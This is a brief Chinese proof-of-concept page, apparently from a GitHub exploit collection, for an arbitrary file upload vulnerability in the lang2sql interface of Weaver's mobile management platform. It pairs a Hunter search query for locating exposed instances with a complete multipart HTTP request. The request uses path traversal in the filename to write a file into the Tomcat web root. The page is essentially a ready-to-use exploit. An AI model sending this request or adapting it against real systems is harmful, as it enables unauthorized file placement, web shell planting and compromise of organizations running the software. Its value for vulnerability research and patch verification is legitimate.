## 泛微移动管理平台lang2sql接口任意文件上传

## hunter

```
web.title="移动管理平台"
```


## poc
```
POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
Content-Type: multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
Host: 目标地址
Content-Length: 202
Expect: 100-continue
Connection: close

------WebKitFormBoundarymVk33liI64J7GQaK
Content-Disposition: form-data; name="file";filename="../../../../appsvr/tomcat/webapps/ROOT/9SIpL.txt"

b9Q2Itmn1
------WebKitFormBoundarymVk33liI64J7GQaK--
```
![0302764cce0476f1d9d11374c18c024b](https://github.com/wy876/POC/assets/139549762/84018feb-2591-45a6-bf0f-663f32e7d98f)

![5cd4ffd5a4d86ad03d7208e3cc646f86](https://github.com/wy876/POC/assets/139549762/62003fb2-0dea-4dde-87ad-4c4165cc55d8)
